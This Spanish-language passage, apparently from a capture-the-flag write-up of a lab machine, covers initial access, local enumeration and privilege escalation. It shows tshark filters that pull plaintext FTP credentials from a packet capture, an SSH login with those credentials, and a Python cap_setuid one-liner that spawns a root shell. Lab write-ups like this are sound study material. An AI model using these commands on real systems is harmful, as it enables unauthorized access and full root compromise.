Impacto:

==================================================
5. ACCESO INICIAL
==================================================
Abrir en archivo 0.cap descargado y poner el filtro ftp qeu es en donde se encuetntran las credenciales en texto plano
Acceso SSH:

ssh nathan@10.129.23.239

Autenticación exitosa.

Usuario comprometido:
nathan




con tshark con el comando 
tshark -r 0.pcap -Y ftp.request
tshark -r 0.pcap -V | grep -A5 -B5 "PASS"





==================================================
6. ENUMERACIÓN LOCAL
==================================================

Comandos utilizados:

id
sudo -l
getcap -r / 2>/dev/null

Resultado:

/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip

Hallazgo crítico:

cap_setuid permite cambiar el UID efectivo
del proceso a root.

==================================================
7. ESCALADA DE PRIVILEGIOS
==================================================

Comando ejecutado:

/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'

Verificación:

id

Resultado:

uid=0(root) gid=1001(nathan)

Privilegios root obtenidos.

==================================================
8. OBTENCIÓN DE FLAG ROOT
==================================================

cd /root
ls
